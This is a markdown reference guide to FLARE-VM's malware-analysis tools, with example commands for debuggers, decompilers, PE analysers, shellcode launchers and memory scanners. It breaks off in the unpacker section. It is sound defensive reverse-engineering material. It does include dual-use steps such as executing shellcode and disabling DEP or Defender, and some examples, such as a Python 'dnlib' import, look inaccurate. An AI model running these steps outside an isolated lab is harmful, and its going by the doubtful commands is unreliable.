# FLARE-VM — Complete Tools Reference with Commands and Examples

> **Source**: [github.com/mandiant/flare-vm](https://github.com/mandiant/flare-vm) | [github.com/mandiant/VM-Packages/wiki/Packages](https://github.com/mandiant/VM-Packages/wiki/Packages) | Compiled June 2026
>
> FLARE-VM is a **Windows-based** malware analysis and reverse engineering environment by Mandiant's FLARE team.
> It uses **Chocolatey** for package management. **Bold** entries are in the default install configuration.
>
> **Important:** FLARE-VM must only be installed on a virtual machine with Windows Defender and Tamper Protection disabled.
>
> Install a package at any time: `choco install -y <package_name>.vm`

---

## Table of Contents
1. [Disassemblers & Decompilers](#1-disassemblers--decompilers)
2. [Debuggers](#2-debuggers)
3. [PE Analysis](#3-pe-analysis)
4. [File Identification & Hashing](#4-file-identification--hashing)
5. [Hex Editors](#5-hex-editors)
6. [.NET Analysis](#6-net-analysis)
7. [Python Analysis](#7-python-analysis)
8. [Java & Android Analysis](#8-java--android-analysis)
9. [JavaScript Analysis](#9-javascript-analysis)
10. [Shellcode Analysis](#10-shellcode-analysis)
11. [Memory Analysis](#11-memory-analysis)
12. [Document Analysis](#12-document-analysis)
13. [Go Binary Analysis](#13-go-binary-analysis)
14. [Delphi & Visual Basic](#14-delphi--visual-basic)
15. [InnoSetup & Packers](#15-innosetup--packers)
16. [Forensic Tools](#16-forensic-tools)
17. [Registry Analysis](#17-registry-analysis)
18. [Networking](#18-networking)
19. [Utilities & Scripting](#19-utilities--scripting)
20. [Sysinternals Suite](#20-sysinternals-suite)
21. [Package Management](#21-package-management)

---

> **Note on Windows CLI:** Most FLARE-VM tools are GUI-based Windows applications. Where CLI usage applies, commands are shown for PowerShell or CMD. Many tools are also invoked by drag-and-drop or right-click. Default install paths are under `C:\tools\` unless otherwise noted.

---

## 1. Disassemblers & Decompilers

---

### Ghidra ⭐ (default)
NSA's open-source software reverse engineering suite. Supports x86, ARM, MIPS, PowerPC, and more.

```powershell
# Launch GUI
ghidra

# Headless analysis (no GUI)
analyzeHeadless C:\projects\project_name ProjectName -import C:\samples\malware.exe -postScript PrintAST.java
analyzeHeadless C:\projects\proj Proj -import malware.exe -analysisTimeoutPerFile 120
analyzeHeadless C:\projects\proj Proj -process malware.exe -postScript ExportFunctions.java

# Run a specific script against already-imported binary
analyzeHeadless C:\projects\proj Proj -process malware.exe -postScript FindStrings.java -scriptPath C:\ghidra_scripts\
```

---

### IDA Free ⭐ (default) / IDA Pro
The industry-standard interactive disassembler and debugger. Free version supports x86/x64.

```powershell
# Open a file in IDA (GUI)
idafree64.exe malware.exe     # 64-bit
idafree.exe malware.exe       # 32-bit

# IDA Pro — headless batch analysis
idat.exe -A -S"script.idc" malware.exe          # Run IDC script automatically
idat64.exe -A -B malware.exe                     # Batch mode, produce .idb
idat64.exe -A malware.exe -o output.idb          # Specify output IDB

# Common keyboard shortcuts (inside IDA):
# F5          - Decompile function (requires Hex-Rays)
# G           - Go to address
# N           - Rename symbol
# ;           - Add comment
# Ctrl+F      - Find text
# X           - Cross-references
# Alt+T       - Search for text in disassembly
# Ctrl+S      - Save database
```

---

### Binary Ninja ⭐ (default)
Modern interactive decompiler, disassembler, debugger, and binary analysis platform.

```powershell
# Launch GUI
binaryninja malware.exe

# Python API / headless analysis
python3 -c "import binaryninja; bv = binaryninja.open_view('malware.exe'); bv.update_analysis_and_wait(); print([f.name for f in bv.functions])"

# Common BN Python API usage:
# bv = binaryninja.open_view('malware.exe')
# bv.functions          - List all functions
# bv.get_symbols()      - Get all symbols
# f = bv.get_function_at(0x401000)  # Get function at address
# f.hlil                - High-level IL
# f.mlil                - Medium-level IL
```

---

### Cutter ⭐ (default)
Free, open-source GUI disassembler/decompiler powered by Rizin (radare2 fork).

```powershell
# Launch GUI
cutter malware.exe

# Command-line via rizin (underlying engine)
rizin malware.exe        # Interactive mode
rizin -A malware.exe     # Auto-analyze then open
rizin -c "aaa; pdf @ main" malware.exe  # Run commands and exit

# Common rizin commands (inside shell):
# aaa        - Full auto-analysis
# afl        - List functions
# pdf @ sym.main  - Disassemble main
# iz         - List strings
# ii         - Imports
# iE         - Exports
# s 0x401000 - Seek to address
# VV         - Visual graph mode
```

---

## 2. Debuggers

---

### x64dbg ⭐ (default)
The primary debugger for FLARE-VM. User-mode debugger for x32/x64 Windows binaries.

```
# Launch from Start Menu or:
x64dbg.exe          # Opens file dialog
x64dbg.exe malware.exe
x32dbg.exe malware.exe    # 32-bit

# Key keyboard shortcuts inside x64dbg:
# F2          - Toggle breakpoint
# F7          - Step into
# F8          - Step over
# F9          - Run (continue)
# Ctrl+F9     - Run until return (execute till ret)
# Ctrl+G      - Go to address
# Ctrl+B      - Open breakpoint list
# Alt+M       - Memory map view
# Alt+L       - Log view
# Ctrl+F      - Find in disassembly

# Plugins (bundled in default install):
# ScyllaHide  - Anti-anti-debug (bypass IsDebuggerPresent, etc.)
# OllyDumpEx  - Process memory dumper
# DbgChild    - Auto-attach to child processes
# x64dbgpy    - Python scripting inside debugger
```

---

### WinDbg ⭐ (default)
Microsoft's kernel and user-mode debugger. Essential for kernel-level and crash dump analysis.

```powershell
# Launch WinDbg (Preview — modern version)
windbg.exe malware.exe

# Kernel debugging (set up target first)
windbg.exe -k com:pipe,port=\\.\pipe\com_1,resets=0,reconnect

# Analyze a crash dump
windbg.exe -z C:\dumps\memory.dmp
windbg.exe -y srv*C:\symbols*https://msdl.microsoft.com/download/symbols -z memory.dmp

# Common WinDbg commands:
# .sympath srv*C:\symbols*https://msdl.microsoft.com/download/symbols
# .reload /f      - Force symbol reload
# !analyze -v     - Auto-analyze crash/exception
# bp 0x401000     - Set breakpoint at address
# bp kernel32!CreateFileW  - Breakpoint on API
# g               - Go (continue execution)
# p               - Step over
# t               - Step into
# k               - Stack trace
# ~*k             - Stack trace all threads
# dt nt!_EPROCESS - Dump structure definition
# !dh malware.exe - Display PE header
# !peb            - Display Process Environment Block
# lm              - List loaded modules
# x malware!*     - List all symbols in module
# .writemem C:\out.bin 0x401000 L0x1000  - Dump memory region
```

---

### TTD (Time Travel Debugging) ⭐ (default)
Record and replay execution — step backwards through a trace.

```powershell
# Record a process execution
ttd.exe -out C:\traces\ malware.exe

# Record and attach to running process
ttd.exe -attach <PID>

# Open trace in WinDbg
windbg.exe -z C:\traces\malware01.run

# Inside WinDbg with TTD trace:
# !tt 0           - Go to start of trace
# !tt 100         - Go to end of trace (100%)
# !tt 50          - Go to 50% through trace
# g-              - Step backwards (reverse continue)
# p-              - Step backwards over
# t-              - Step backwards into
# bp kernel32!CreateFileW   - Set breakpoint, then g to find all calls
```

---

### OllyDbg / OllyDbg2
Classic 32-bit debugger. Still useful for older malware.

```
# Launch
ollydbg.exe malware.exe

# Bundled plugins:
# ScyllaHide  - Anti-anti-debug bypass
# OllyDumpEx  - Memory dumper
```

---

## 3. PE Analysis

---

### pestudio ⭐ (default)
Initial PE assessment tool — shows imports, strings, indicators, and anomalies without executing.

```powershell
# GUI — drag and drop a file, or:
pestudio.exe malware.exe

# Key analysis areas in pestudio:
# - File header (entropy, compile time, subsystem)
# - Imports (suspicious APIs highlighted in red)
# - Strings (URLs, IPs, registry keys, file paths)
# - Resources (embedded files, version info)
# - Indicators (Yara matches, anti-analysis tricks)
# - Virustotal (online lookup, requires config)
```

---

### CFF Explorer (ExplorerSuite) ⭐ (default)
Comprehensive PE editor and viewer — headers, sections, imports, resources, and more.

```powershell
# Launch GUI
CFFExplorer.exe malware.exe

# Key features:
# File header / Optional header / Section headers
# Import/Export directory editing
# Resource viewer and extractor
# Rebuilder (recompute checksums, etc.)
# Process viewer (attach to live processes)
```

---

### PE Bear ⭐ (default)
Fast PE viewer for quick "first look" at malware samples.

```powershell
# GUI
PE-bear.exe malware.exe

# Useful for:
# - Quickly spotting section anomalies
# - Viewing rich header
# - Checking ASLR/DEP flags
# - Diffing two PE files
```

---

### PEiD ⭐ (default)
Detect packers, cryptors, and compilers in PE files using signatures.

```powershell
PEiD.exe malware.exe

# Drag and drop or use File menu
# "Multi Scan" mode: scan an entire folder
```

---

### Dependency Walker ⭐ (default)
Show DLL dependencies and imported functions for a PE file.

```powershell
depends.exe malware.exe      # GUI — hierarchical tree of dependencies

# Also useful: Process mode (profile a running process's dynamic imports)
# Module: View > Full Paths to show absolute DLL load paths
```

---

### PE Unmapper ⭐ (default)
Convert between raw (disk) and virtual (memory) PE alignments.

```powershell
pe_unmapper.exe malware_dump.bin output.exe    # Unmap a memory dump to PE
pe_unmapper.exe -help                          # Show options
```

---

### DLL to EXE ⭐ (default)
Wrap a DLL in an EXE so it can be debugged more easily.

```powershell
dll_to_exe.exe malware.dll output.exe          # Convert DLL to runnable EXE
dll_to_exe.exe -ep DllMain malware.dll out.exe # Specify entry point
```

---

### Resource Hacker ⭐ (default)
View, extract, add, replace, and delete resources in PE files.

```powershell
# GUI
ResourceHacker.exe -open malware.exe -action view

# Command-line
ResourceHacker.exe -open malware.exe -action extract -mask RT_RCDATA,, -save extracted\
ResourceHacker.exe -open malware.exe -action extract -mask 3,, -save icon.ico
ResourceHacker.exe -open malware.exe -action list                    # List all resources
```

---

### setdllcharacteristics
CLI tool to manipulate ASLR, DEP, and signature flags in PE files.

```powershell
setdllcharacteristics.exe malware.exe          # Show current flags
setdllcharacteristics.exe malware.exe -nx      # Disable DEP/NX
setdllcharacteristics.exe malware.exe -aslr    # Disable ASLR
```

---

### BinDiff ⭐ (default)
Diff two binary files by comparing their disassembled code — useful for patch analysis.

```powershell
# GUI-based (runs as IDA/BinaryNinja plugin or standalone)
bindiff malware_v1.idb malware_v2.idb        # Compare two IDA databases
bindiff.exe --ui                              # Launch standalone GUI
bindiff.exe --primary=file1.exe --secondary=file2.exe --output=diff.BinDiff
```

---

### capa ⭐ (default)
Automatically identify capabilities of PE files and shellcode using rule matching.

```powershell
capa.exe malware.exe                          # Full capability analysis
capa.exe -v malware.exe                       # Verbose output
capa.exe -vv malware.exe                      # Very verbose (show matched bytes)
capa.exe malware.exe -j                       # JSON output
capa.exe malware.exe -o report.json -j        # Save JSON report
capa.exe --rules C:\rules\ malware.exe        # Custom rules directory
capa.exe malware.exe --format pe              # Force PE format
capa.exe malware.exe --format sc32            # Treat as 32-bit shellcode
capa.exe malware.exe --format sc64            # Treat as 64-bit shellcode
capa.exe -r C:\capa-rules\ malware.exe -t "send data"  # Filter by capability
```

---

### FLOSS ⭐ (default)
FLARE Obfuscated String Solver — extract stack strings, tight loop strings, and decoded strings.

```powershell
floss.exe malware.exe                          # Full extraction
floss.exe --no-static-strings malware.exe      # Skip simple strings
floss.exe -n 6 malware.exe                     # Min string length 6
floss.exe malware.exe -j                       # JSON output
floss.exe malware.exe --format sc32            # Treat as shellcode
floss.exe malware.exe | findstr /i "http"      # Filter results
```

---

## 4. File Identification & Hashing

---

### DIE (Detect-It-Easy) ⭐ (default)
Identify file type, compiler, packer, and protections with high accuracy.

```powershell
# GUI
die.exe malware.exe

# CLI version (diec)
diec.exe malware.exe                           # Identify file
diec.exe -j malware.exe                        # JSON output
diec.exe -r C:\samples\                        # Scan directory
diec.exe --all malware.exe                     # Show all detections
```

---

### ExeInfoPE ⭐ (default)
Identify packers, cryptors, and compilers in executables.

```powershell
exeinfope.exe malware.exe                      # Detect packer/compiler
# GUI — drag and drop files
```

---

### HashMyFiles ⭐ (default)
Calculate and export MD5, SHA1, SHA256, CRC32 hashes for files.

```powershell
# GUI — drag and drop or File > Add Files
HashMyFiles.exe /files "C:\samples\malware.exe" /stext results.txt
HashMyFiles.exe /folder C:\samples /subfolders /stext all_hashes.txt
HashMyFiles.exe /files malware.exe /stab results.tsv   # Tab-separated
HashMyFiles.exe /files malware.exe /sjson results.json # JSON output
```

---

### Magika ⭐ (default)
Google's AI-powered file type identification.

```powershell
magika malware.bin                             # Identify file type
magika --json malware.bin                      # JSON output
magika -r C:\samples\                          # Recursive directory scan
```

---

### file ⭐ (default)
Windows port of Linux `file` utility.

```powershell
file.exe malware.exe                           # Check magic bytes
file.exe -b malware.exe                        # Brief output (type only)
file.exe *                                     # All files in current dir
```

---

### ExifTool
Read and write metadata across many file formats.

```powershell
exiftool malware.exe                           # Show all metadata
exiftool -CompileDate malware.exe              # Compile timestamp
exiftool -FileType malware.bin                 # File type only
exiftool -j malware.exe                        # JSON output
exiftool -csv C:\samples\*.exe > hashes.csv    # Batch CSV output
```

---

## 5. Hex Editors

---

### HxD ⭐ (default)
Fast hex editor for files, raw disks, and RAM.

```powershell
HxD.exe malware.exe                            # Open file
HxD.exe \\.\PhysicalDrive0                    # Open raw disk

# Key features:
# Search > Find (Ctrl+F) — search for hex bytes or strings
# Search > Replace (Ctrl+R)
# View > Data Inspector — structured field view
# RAM Editor — attach to process memory
# Disk Editor — view raw sectors
```

---

### 010 Editor ⭐ (default)
Professional hex editor with Binary Templates for structured parsing.

```powershell
010editor.exe malware.exe                      # Open file
010editor.exe -template PE.bt malware.exe      # Apply PE template
010editor.exe -script analysis.1sc malware.exe # Run script

# Built-in templates include: PE, ELF, PDF, ZIP, GZIP, PNG, BMP, etc.
# Templates gallery at: https://www.sweetscape.com/010editor/repository/templates/
```

---

### ImHex
Open-source hex editor with pattern language, disassembler, and diff.

```powershell
imhex.exe malware.exe                          # Open file
# Features: custom pattern language (.hexpat), data inspector, disassembler view
```

---

## 6. .NET Analysis

---

### dnSpyEx ⭐ (default)
.NET assembly debugger and decompiler — the primary .NET analysis tool on FLARE-VM.

```powershell
# GUI — open .exe or .dll
dnspy.exe malware.dll

# Key features:
# Decompile to C# or VB.NET source code
# Edit and recompile .NET assemblies directly
# Debug .NET assemblies (set breakpoints in decompiled code!)
# View IL (Intermediate Language)
# Search all strings across the assembly
# Module > Edit Assembly Attributes

# Keyboard shortcuts:
# F5          - Start debugging
# F9          - Toggle breakpoint
# F10         - Step over
# F11         - Step into
# Ctrl+F      - Search
# Ctrl+Shift+K - Decompile to file
```

---

### ILSpy ⭐ (default)
Open-source .NET assembly browser and decompiler.

```powershell
# GUI
ILSpy.exe malware.dll

# CLI (ilspycmd)
ilspycmd malware.dll                           # Decompile to stdout
ilspycmd -o C:\output\ malware.dll            # Output to directory
ilspycmd --list-types malware.dll             # List all types
ilspycmd -t "Namespace.ClassName" malware.dll # Decompile specific type
ilspycmd -il malware.dll                       # Show IL bytecode
ilspycmd malware.dll > source.cs              # Save to file
```

---

### de4dot-CEx ⭐ (default)
Deobfuscate and unpack .NET assemblies, with full ConfuserEx support.

```powershell
de4dot.exe malware.exe                         # Auto-detect and deobfuscate
de4dot.exe malware.exe -o cleaned.exe          # Save to output
de4dot.exe --detect malware.exe                # Detect obfuscator only
de4dot.exe --all-flows malware.exe             # Maximum deobfuscation
de4dot.exe malware.exe --strtyp delegate --strtok 0x02000003  # Manual string decryption
```

---

### NETReactorSlayer ⭐ (default)
Deobfuscate and unpack Eziriz .NET Reactor protected assemblies.

```powershell
NETReactorSlayer.exe -i malware.exe            # Auto deobfuscate
NETReactorSlayer.exe -i malware.exe -o out.exe # Specify output
NETReactorSlayer.exe --no-dump malware.exe     # Skip memory dump
```

---

### ExtremeDumper ⭐ (default)
Dump .NET assemblies from process memory (useful for packed/encrypted .NET).

```powershell
# GUI — launch and click "Dump All"
ExtremeDumper.exe

# Select a process running the .NET malware, click "Dump All Assemblies"
# Dumped assemblies saved to %temp%\ExtremeDumper\
```

---

### DotDumper ⭐ (default)
Automatic unpacker and logger for .NET Framework files.

```powershell
DotDumper.exe --file malware.exe               # Run and log
DotDumper.exe --file malware.exe --output C:\dump\  # Specify output
DotDumper.exe --help                           # Show options
```

---

### RunDotNetDll ⭐ (default)
List and invoke methods from .NET assemblies from the command line.

```powershell
RunDotNetDll.exe /list malware.dll             # List all methods
RunDotNetDll.exe /run malware.dll Namespace.Class Method  # Invoke method
RunDotNetDll.exe /run malware.dll /args arg1 arg2         # With arguments
```

---

### GarbageMan ⭐ (default) + psnotify ⭐
.NET heap analysis toolkit.

```powershell
# psnotify - fight .NET anti-dumping tricks
psnotify.exe <PID>                             # Monitor .NET events for PID

# GarbageMan - analyze .NET heap dumps
garbageman.exe dump.bin                        # Analyze heap dump
```

---

### sfextract ⭐ (default)
Extract contents from .NET single-file bundles.

```powershell
sfextract.exe malware.exe                      # Extract bundle contents
sfextract.exe malware.exe -o C:\extracted\     # Save to directory
```

---

### CodeTrack ⭐ (default)
Free .NET performance profiler and execution analyzer.

```powershell
# GUI — launch and attach to process, or run a .NET file directly
CodeTrack.exe

# Key use: trace all method calls in .NET malware execution
```

---

### dnlib ⭐ (default)
.NET module/assembly reader/writer library (used in Python/C# scripts).

```powershell
# Python example:
python3 -c "
import dnlib
mod = dnlib.DotNet.ModuleDefMD.Load('malware.dll')
for t in mod.Types:
    print(t.Name)
"
```

---

## 7. Python Analysis

---

### pycdc ⭐ (default)
Decompile Python .pyc bytecode files back to source code.

```powershell
pycdc.exe malware.pyc                          # Decompile to stdout
pycdc.exe malware.pyc > source.py             # Save output
pycdc.exe -o source.py malware.pyc            # With output flag
```

---

### pycdas ⭐ (default)
Disassemble Python bytecode (lower level than pycdc).

```powershell
pycdas.exe malware.pyc                         # Disassemble bytecode
pycdas.exe malware.pyc > bytecode.txt         # Save output
```

---

### uncompyle6 ⭐ (default)
Decompile Python 1.0–3.8 bytecode.

```powershell
uncompyle6 malware.pyc                         # Decompile
uncompyle6 -o output/ malware.pyc             # Output to directory
uncompyle6 --version                           # Show version
python3 -m uncompyle6 malware.pyc             # Alternative invocation
```

---

### unpyc3 ⭐ (default)
Decompile Python 3.7+ bytecode.

```powershell
unpyc3 malware.pyc                             # Decompile
python3 unpyc3.py malware.pyc > source.py     # Save output
```

---

### Python 3 Libraries ⭐ (default)
The `libraries.python3.vm` package installs common RE-oriented Python libraries:

```powershell
# Useful installed Python libraries include:
# pefile     - Parse PE files
# yara-python - YARA scanning
# capstone   - Disassembly engine
# keystone-engine - Assembly engine
# unicorn    - CPU emulator
# angr       - Binary analysis framework
# lief       - Parse PE/ELF/MachO
# pwntools   - Binary exploitation utilities
# cryptography / pycryptodome - Cryptographic operations
# requests   - HTTP client

# Example pefile usage:
python3 -c "
import pefile
pe = pefile.PE('malware.exe')
for entry in pe.DIRECTORY_ENTRY_IMPORT:
    print(entry.dll)
    for imp in entry.imports:
        print('  ', imp.name)
"

# Example YARA usage:
python3 -c "
import yara
rules = yara.compile('rules.yar')
matches = rules.match('malware.exe')
print(matches)
"
```

---

## 8. Java & Android Analysis

---

### Bytecode Viewer ⭐ (default)
All-in-one Java/Android decompiler, editor, and analysis tool.

```powershell
BytecodeViewer.exe                             # Launch GUI
BytecodeViewer.exe malware.jar                 # Open file directly
BytecodeViewer.exe malware.apk                 # Android APK

# Features: Multiple decompilers (Procyon, CFR, Fernflower), bytecode view,
#           Krakatau decompiler, hex view, Smali editor
```

---

### Apktool ⭐ (default)
Reverse engineer Android APK files (decode resources, disassemble Dalvik).

```powershell
apktool d malware.apk                          # Decompile APK
apktool d malware.apk -o output\               # Specify output dir
apktool b output\ -o rebuilt.apk              # Rebuild APK
apktool d malware.apk --no-src                # Resources only (no smali)
apktool d --force malware.apk                  # Force overwrite
```

---

### dex2jar ⭐ (default)
Convert Android .dex files to Java .jar for decompilation.

```powershell
d2j-dex2jar.exe malware.apk                    # Convert APK to JAR
d2j-dex2jar.exe classes.dex -o output.jar      # Convert .dex to .jar
d2j-jar2dex.exe output.jar -o classes.dex      # JAR back to DEX
d2j-dex-dump.exe classes.dex                   # Dump DEX structure
```

---

### Recaf ⭐ (default)
Java bytecode editor with a modern GUI.

```powershell
recaf.exe malware.jar                          # Open file in editor
recaf.exe malware.class                        # Open class file

# Features: decompile, edit, recompile class files without full IDE
```

---

## 9. JavaScript Analysis

---

### js-beautify ⭐ (default)
Deobfuscate and format JavaScript code.

```powershell
js-beautify malware.js                         # Beautify JS
js-beautify -o clean.js malware.js            # Save output
js-beautify --indent-size 2 malware.js        # Custom indent
js-beautify malware.html                       # Also works on HTML
```

---

### js-deobfuscator ⭐ (default)
Remove common JavaScript obfuscation techniques.

```powershell
js-deobfuscator -i malware.js -o deobf.js      # Deobfuscate file
js-deobfuscator -i malware.js                  # Output to stdout
```

---

### obfuscator-io-deobfuscator ⭐ (default)
Specifically targets Obfuscator.io obfuscated JavaScript.

```powershell
obfuscator-io-deobfuscator -i malware.js -o clean.js  # Deobfuscate
```

---

### malware-jail ⭐ (default)
Sandbox for semi-automatic JavaScript malware analysis and deobfuscation.

```powershell
# Run in sandbox environment
node malware-jail.js malware.js                # Execute in sandbox
node malware-jail.js -r malware.js             # Record network/FS calls
node malware-jail.js --help                    # Show options

# Key feature: intercepts WScript/ActiveX calls to reveal what malicious JS would do
```

---

## 10. Shellcode Analysis

---

### scdbg ⭐ (default)
Shellcode emulator and API logger — execute shellcode in a controlled environment.

```powershell
# GUI version
scdbg.exe

# Command-line
scdbg.exe /f shellcode.bin                     # Emulate shellcode
scdbg.exe /f shellcode.bin /r                  # Report mode (less output)
scdbg.exe /f shellcode.bin /max 1000           # Limit to 1000 instructions
scdbg.exe /f shellcode.bin /findsc             # Find shellcode offset
scdbg.exe /f shellcode.bin /d                  # Dump emulated memory
scdbg.exe /f malware.exe /ofs 0x400           # Shellcode at offset
scdbg.exe /f shellcode.bin /api_calls          # Show all API calls
```

---

### BlobRunner ⭐ (default) — 32-bit and 64-bit
Load shellcode into memory and attach a debugger.

```powershell
# 32-bit shellcode
blobrunner.exe shellcode.bin
blobrunner.exe shellcode.bin 0x10000           # Load at specified address

# 64-bit shellcode
blobrunner64.exe shellcode.bin
blobrunner64.exe shellcode.bin 0x10000

# Usage: BlobRunner loads the shellcode, pauses, then you attach x64dbg
# In x64dbg: File > Attach > select BlobRunner PID
```

---

### ScLauncher / ScLauncher64 ⭐ (default)
Load and execute shellcode — also produces PE output.

```powershell
sclauncher.exe shellcode.bin                   # Load 32-bit shellcode
sclauncher64.exe shellcode.bin                 # Load 64-bit shellcode
sclauncher.exe shellcode.bin -e                # Execute immediately
sclauncher.exe shellcode.bin -pe output.exe    # Convert shellcode to PE
```

---

### shellcode_launcher ⭐ (default)
Simple shellcode launcher utility.

```powershell
shellcode_launcher.exe -i shellcode.bin        # Execute shellcode
shellcode_launcher.exe -i shellcode.bin -w     # Wait for debugger attach
```

---

## 11. Memory Analysis

---

### PE-sieve ⭐ (default)
Scan a running process for injected/implanted PE files, shellcode, hooks.

```powershell
pe-sieve.exe --pid 1234                        # Scan process by PID
pe-sieve.exe --pid 1234 --oformat json         # JSON output
pe-sieve.exe --pid 1234 --dir C:\dump\         # Dump findings to dir
pe-sieve.exe --pid 1234 --imp 3               # Reconstruct imports (mode 3)
pe-sieve.exe --pid 1234 --shellc              # Include shellcode regions
pe-sieve.exe --pid 1234 --obfusc 1            # Detect obfuscated PEs
pe-sieve.exe --pid 1234 --refl                # Include reflective DLLs
pe-sieve.exe --pid 1234 --iat 3               # Scan IAT for hooks
```

---

### HollowsHunter ⭐ (default)
Scan all running processes for suspicious implants (shells, hooks, patches).

```powershell
hollows_hunter.exe                             # Scan all processes
hollows_hunter.exe /oformat json               # JSON report
hollows_hunter.exe /dir C:\dump\               # Dump findings
hollows_hunter.exe /pname explorer.exe         # Scan specific process by name
hollows_hunter.exe /pid 1234                   # Scan specific PID
hollows_hunter.exe /shellc                     # Include shellcode
hollows_hunter.exe /hooks                      # Include hooks
hollows_hunter.exe /minidmp                   # Create minidumps of suspicious regions
```

---

### ProcessDump ⭐ (default)
Dump malware memory components back to disk.

```powershell
pd.exe -pid 1234                               # Dump process by PID
pd.exe -system                                 # Dump all processes
pd.exe -pid 1234 -dir C:\dump\                # Specify output dir
pd.exe -pid 1234 -close                        # Kill process after dump
pd.exe -pid 1234 -unfixed                     # Dump without fixing headers
```

---

### MemProcFS
Mount a memory image (or live process memory) as a file system.

```powershell
MemProcFS.exe -device memory.dmp               # Mount memory dump
MemProcFS.exe -device memory.dmp -mount M:     # Mount to drive letter M:
MemProcFS.exe -device fpga                     # Use DMA hardware device
MemProcFS.exe -device memory.dmp -forensic 1  # Enable forensic mode

# After mounting, browse in Explorer:
# M:\sys\proc\           - Process info
# M:\sys\net\            - Network connections
# M:\pid\1234\           - Process 1234 details
# M:\pid\1234\minidump\  - Process minidump
# M:\sys\registry\       - Registry hives
```

---

## 12. Document Analysis

---

### Didier Stevens Suite ⭐ (default)
Comprehensive collection of Python scripts for analyzing malicious documents and data.
Installed to `C:\tools\DidierStevensSuite\`

```powershell
# PDF analysis
pdfid.py malware.pdf                           # Identify suspicious elements
pdf-parser.py malware.pdf                      # Full PDF structure analysis
pdf-parser.py -s /JS malware.pdf              # Search for JavaScript
pdf-parser.py -o 10 malware.pdf               # Inspect object 10
pdf-parser.py -f malware.pdf                   # Follow stream filters
pdfstreamdumper.exe malware.pdf               # (GUI) dump PDF streams

# Office / OLE analysis
oledump.py malware.doc                         # List OLE streams
oledump.py -s 7 malware.doc                   # Show stream 7
oledump.py -s 7 -v malware.doc               # VBA decompress stream 7
rtfdump.py malware.rtf                         # Analyze RTF structure
zipdump.py malware.docx                        # Analyze OOXML/ZIP container
olevba.py malware.doc                          # Extract VBA macros
emldump.py malware.eml                         # Parse email files

# Data decoding tools
base64dump.py malware.exe                      # Find and decode base64
xorsearch.exe malware.exe "http"              # Search XOR-encoded strings
floss.exe malware.exe                          # Extract all string types
translate.py "byte ^ 0x41" malware.bin > out.bin  # XOR decode

# Hashing and comparison
1768.py malware.bin                            # Cobalt Strike beacon analysis
```

---

### PDFStreamDumper ⭐ (default)
GUI tool for analyzing and extracting malicious PDF content.

```powershell
pdfstreamdumper.exe malware.pdf               # Launch GUI
# Features: decompress streams, search JavaScript, extract embedded files,
#           run shellcode emulation on extracted content
```

---

### OffVis ⭐ (default)
Visualize and deconstruct targeted attacks in Office (.doc, .xls, .ppt) files.

```powershell
offvis.exe malware.doc                         # Open in GUI
# Shows internal OLE structure and highlights exploit areas
```

---

### OneNoteAnalyzer ⭐ (default)
Analyze malicious OneNote (.one) documents.

```powershell
OneNoteAnalyzer.exe -f malware.one             # Analyze file
OneNoteAnalyzer.exe -f malware.one -o C:\out\  # Extract to directory
OneNoteAnalyzer.exe --help                     # Show options
```

---

### EZviewer ⭐ (default)
Standalone document viewer and hex editor — no Office required.

```powershell
EZViewer.exe malware.doc                       # Open document
EZViewer.exe malware.pdf                       # Open PDF
# Good for previewing documents without risking execution
```

---

## 13. Go Binary Analysis

---

### GoReSym ⭐ (default)
Recover function names, source paths, and type information from stripped Go binaries.

```powershell
GoReSym.exe -t -d -p malware.exe              # Full analysis (types, data, paths)
GoReSym.exe -t malware.exe                    # Types only
GoReSym.exe -v malware.exe                    # Verbose
GoReSym.exe malware.exe > symbols.json        # Save JSON output
GoReSym.exe -remap malware.exe                # Also remap function names

# Then import results into IDA/Ghidra/Binary Ninja for annotation
```

---

### GoStringUngarbler ⭐ (default)
Deobfuscate strings in Go binaries obfuscated by garble.

```powershell
gostringungarbler.exe malware.exe             # Deobfuscate garbled strings
gostringungarbler.exe malware.exe -o out.exe  # Save deobfuscated binary
gostringungarbler.exe -v malware.exe          # Verbose
```

---

## 14. Delphi & Visual Basic

---

### IDR (Interactive Delphi Reconstructor) ⭐ (default)
Decompile Delphi-compiled Windows EXEs and DLLs.

```powershell
# GUI — open via Start menu or:
IDR.exe malware.exe

# Key features:
# Reconstruct Delphi classes and methods
# Export to Pascal source code
# Import symbols into IDA via IDC script
```

---

### VB Decompiler Lite ⭐ (default)
Decompile Visual Basic 5/6 and .NET binaries.

```powershell
VBDecompiler.exe malware.exe                   # Launch GUI and open file
# Recovers P-Code and pseudo-source for VB5/6 binaries
```

---

### VBDec ⭐ (default)
VB file format viewer, P-Code disassembler, and debugger.

```powershell
vbdec.exe malware.exe                          # Open in GUI
# Features: P-Code disassembly, form resource viewer, debug capability
```

---

## 15. InnoSetup & Packers

---

### innoextract ⭐ (default)
Unpack Inno Setup installers without executing them.

```powershell
innoextract.exe installer.exe                  # Extract to current dir
innoextract.exe -d C:\extracted\ installer.exe # Extract to directory
innoextract.exe -l installer.exe               # List contents only
innoextract.exe -e installer.exe               # Extract with original paths
```

---

### innounp ⭐ (default)
Another Inno Setup unpacker.

```powershell
innounp.exe -x installer.exe                   # Extract
innounp.exe -v installer.exe                   # Verbose extract
innounp.exe -l installer.exe                   # List only
innounp.exe -x -d C:\output\ installer.exe    # Extract to directory
```

---

### IFPSTools ⭐ (default)
Create, modify, assemble, and disassemble RemObjects Pascal Script compiled bytecode.

```powershell
IFPSAsmGui.exe script.ifps                     # GUI assembler
IFPSDecompGUI.exe script.ifps                  # GUI decompiler
IFPSDecomp.exe script.ifps > script.pas       # CLI decompile
IFPSAsm.exe script.pas script.ifps            # CLI assemble
```

---

### ISD (Inno Setup Decompiler) ⭐ (default)
GUI-based Inno Setup compiled script analyzer.

```powershell
isd.exe installer.exe                          # Launch GUI
# Analyzes and displays the compiled Pascal script within an installer
```

---

### UPX ⭐ (default)
Unpack UPX-compressed executables.

```powershell
upx.exe -d packed.exe                          # Decompress in-place
upx.exe -d packed.exe -o unpacked.exe         # Decompress to new file
upx.exe -l packed.exe                          # List packing info
upx.exe -t packed.exe                          # Test integrity
```

---

### UniExtract2 ⭐ (default)
Universal Extractor — unpack almost any installer or archive format.

```powershell
# GUI — right-click a file > Extract with UniExtract
UniExtract2.exe installer.exe C:\extracted\   # CLI extract

# Supports: NSIS, InstallShield, WiX, ZIP, 7z, MSI, CAB, and many more
```

---

### AutoIt-Ripper ⭐ (default)
Extract compiled AutoIt scripts from PE executables.

```powershell
autoit-ripper.exe malware.exe                  # Extract AutoIt script
autoit-ripper.exe malware.exe output.au3      # Save to file
autoit-ripper.exe -v malware.exe              # Verbose
```

---

### asar ⭐ (default)
